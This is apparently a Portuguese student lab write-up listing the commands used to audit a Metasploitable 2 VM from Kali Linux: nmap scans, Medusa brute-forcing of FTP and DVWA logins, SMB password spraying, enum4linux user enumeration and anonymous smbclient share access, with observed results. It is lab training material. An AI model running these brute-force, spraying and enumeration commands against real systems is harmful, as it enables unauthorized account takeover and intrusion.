
# Comandos Utilizados — Auditoria com Kali Linux e Medusa

## 1. Informações do laboratório

| Máquina | Endereço IP |
|---|---|
| Kali Linux | 192.168.56.101 |
| Metasploitable 2 | 192.168.56.102 |
| Rede | 192.168.56.0/24 |
| Tipo de rede | Host-only (VirtualBox) |

---

## 2. Reconhecimento de rede

### Verificar interfaces de rede

```bash
ip a
```

Exibe as interfaces de rede e os endereços IP configurados.

### Testar comunicação com o alvo

```bash
ping 192.168.56.102
```

Verifica a conectividade entre o Kali Linux e o Metasploitable 2.

### Identificar serviços e versões

```bash
sudo nmap -sV -sC -oN reconhecimento-inicial.txt 192.168.56.102
```

- `-sV`: identifica versões dos serviços.
- `-sC`: executa scripts padrão do Nmap.
- `-oN`: salva o resultado em arquivo de texto.

### Verificar todas as portas TCP

```bash
sudo nmap -p- -T3 -oN portas_abertas.txt 192.168.56.102
```

- `-p-`: verifica todas as portas TCP.
- `-T3`: define a velocidade de varredura.
- `-oN`: salva o resultado.

### Filtrar portas abertas

```bash
grep " open " portas_abertas.txt
```

Exibe as linhas que indicam portas abertas.

### Identificar especificamente a versão do FTP

```bash
sudo nmap -sV -p 21 --reason 192.168.56.102
```

- `-p 21`: verifica a porta FTP.
- `--reason`: apresenta o motivo pelo qual a porta foi classificada.

### Consultar o banner FTP

```bash
nc -nv 192.168.56.102 21
```

Estabelece uma conexão TCP com a porta 21 para visualizar o banner do serviço.

---

## 3. Preparação das wordlists

### Criar diretórios

```bash
mkdir -p ~/auditoria-brute-force/wordlists
```

### Criar lista de usuários FTP

```bash
printf "msfadmin\n" > wordlists/usuarios-ftp.txt
```

### Criar lista de senhas FTP

```bash
printf "123456\npassword\nmsfadmin\n" > wordlists/senhas-ftp.txt
```

### Criar lista de usuários DVWA

```bash
printf "admin\n" > wordlists/usuarios-dvwa.txt
```

### Criar lista de senhas DVWA

```bash
printf "123456\npassword\nadmin\n" > wordlists/senhas-dvwa.txt
```

### Conferir os arquivos

```bash
for arquivo in wordlists/*.txt; do
    echo "=== $arquivo ==="
    cat "$arquivo"
done
```

### Consultar um arquivo específico

```bash
cat wordlists/usuarios-ftp.txt
```

### Listar arquivos e diretórios

```bash
ls
```

```bash
ls -l wordlists/
```

---

## 4. Auditoria FTP — Medusa

### Verificar instalação e módulos disponíveis

```bash
medusa -d
```

Exibe os módulos disponíveis no Medusa.

### Executar teste controlado no FTP

```bash
medusa -h 192.168.56.102 \
-u msfadmin \
-P ~/auditoria-brute-force/wordlists/senhas-ftp.txt \
-M ftp \
-t 1 \
-f \
-v 6
```

Parâmetros:

- `-h`: endereço IP do alvo.
- `-u`: usuário utilizado.
- `-P`: arquivo com a lista de senhas.
- `-M ftp`: módulo FTP.
- `-t 1`: uma tarefa simultânea.
- `-f`: interrompe após encontrar uma credencial válida.
- `-v 6`: nível detalhado de saída.

Resultado observado: `ACCOUNT FOUND`, com confirmação manual da combinação encontrada.

---

## 5. Auditoria Web — DVWA

### Acessar a aplicação

```text
http://192.168.56.102/dvwa/
```

### Preparação da aplicação

- Configurar o nível de segurança como `Low`.
- Acessar `Vulnerabilities`.
- Selecionar `Brute Force`.
- Utilizar a lista de usuários e senhas preparada para o DVWA.

### Verificar módulo Web do Medusa

```bash
medusa -d
```

O módulo utilizado foi `web-form`.

### Parâmetros técnicos utilizados

O teste foi direcionado à página:

```text
/dvwa/vulnerabilities/brute/
```

O formulário utilizou o método GET e os campos:

```text
username
password
Login
```

A mensagem de falha identificada foi:

```text
username and/or password incorrect
```

A mensagem de sucesso observada foi:

```text
welcome to the password protected area admin
```

O teste utilizou o cookie de sessão PHPSESSID e o parâmetro `security=low`.

**Observação:** o comando completo deve ser mantido conforme executado no laboratório, preservando o cookie de sessão utilizado na execução. Não publicar valores de sessão.

Resultado observado: `ACCOUNT FOUND`, seguido de validação manual bem-sucedida na página Brute Force do DVWA.

---

## 6. Auditoria SMB — Nmap

### Verificar portas SMB

```bash
nmap -p 139,445 -sV 192.168.56.102
```

Verifica as portas 139 e 445 e identifica informações dos serviços.

---

## 7. Auditoria SMB — Enum4linux

### Verificar disponibilidade da ferramenta

```bash
which enum4linux
```

### Enumerar usuários

```bash
enum4linux -U 192.168.56.102
```

Solicita a enumeração de usuários do serviço SMB.

### Salvar a saída da enumeração

```bash
enum4linux -U 192.168.56.102 | tee enum4linux-smb.txt
```

### Filtrar informações de usuários

```bash
grep -Ei 'user:\[|account:' enum4linux-smb.txt
```

Os usuários identificados foram registrados em:

```text
wordlists/usuarios-smb.txt
```

---

## 8. Auditoria SMB — Medusa

### Verificar módulo SMB

```bash
medusa -d | grep -i smb
```

Módulo identificado:

```text
smbnt.mod
```

### Teste controlado de password spraying

```bash
medusa -h 192.168.56.102 \
-U wordlists/usuarios-smb.txt \
-p "password" \
-M smbnt \
-t 1 \
-f \
-v 6
```

Parâmetros:

- `-h`: endereço do alvo.
- `-U`: arquivo com os usuários.
- `-p`: uma única senha para todos os usuários.
- `-M smbnt`: módulo de autenticação SMB.
- `-t 1`: uma tarefa simultânea.
- `-f`: interrompe após encontrar uma credencial válida.
- `-v 6`: saída detalhada.

Resultado observado:

- 1 host.
- 35 usuários.
- 1 senha testada.
- Nenhum `ACCOUNT FOUND`.

O resultado não comprova que todas as contas possuem senhas incorretas. Apenas indica que nenhuma credencial válida foi identificada nessa execução.

---

## 9. Auditoria SMB — SMBClient

### Listar compartilhamentos sem credenciais

```bash
smbclient -L //192.168.56.102 -N
```

Resultado observado:

```text
Anonymous login successful
```

Compartilhamentos identificados:

```text
print$
tmp
opt
IPC$
ADMIN$
```

### Acessar o compartilhamento TMP

```bash
smbclient //192.168.56.102/tmp -N
```

Dentro do prompt SMB:

```bash
ls
```

Sair da sessão:

```bash
exit
```

Resultado: acesso anônimo e listagem permitidos.

### Acessar o compartilhamento OPT

```bash
smbclient //192.168.56.102/opt -N
```

Resultado observado:

```text
NT_STATUS_ACCESS_DENIED
```

### Acessar o compartilhamento PRINT$

```bash
smbclient //192.168.56.102/print$ -N
```

Resultado: acesso anônimo negado.

### Acessar o compartilhamento ADMIN$

```bash
smbclient //192.168.56.102/ADMIN$ -N
```

Resultado: acesso anônimo negado.

### Acessar o compartilhamento IPC$

```bash
smbclient //192.168.56.102/IPC$ -N
```

Resultado: conexão permitida, mas a listagem com `ls` não foi autorizada.

---

## 10. Organização e documentação

### Entrar no diretório do projeto

```bash
cd ~/auditoria-brute-force-kali-medusa
```

### Criar diretório de documentação

```bash
mkdir -p docs
```

### Criar diretório de evidências

```bash
mkdir -p images
```

### Criar diretório de comandos

```bash
mkdir -p commands
```

### Conferir estrutura

```bash
ls -R
```

---

## 11. Observações de segurança

- Os testes foram realizados em ambiente virtual isolado.
- O endereço de destino foi o Metasploitable 2.
- As credenciais utilizadas eram destinadas ao laboratório.
- Não devem ser publicados cookies de sessão, senhas ou credenciais encontradas.
- As wordlists de teste não devem ser utilizadas contra sistemas sem autorização.
- Os resultados registrados correspondem às execuções realizadas durante o projeto.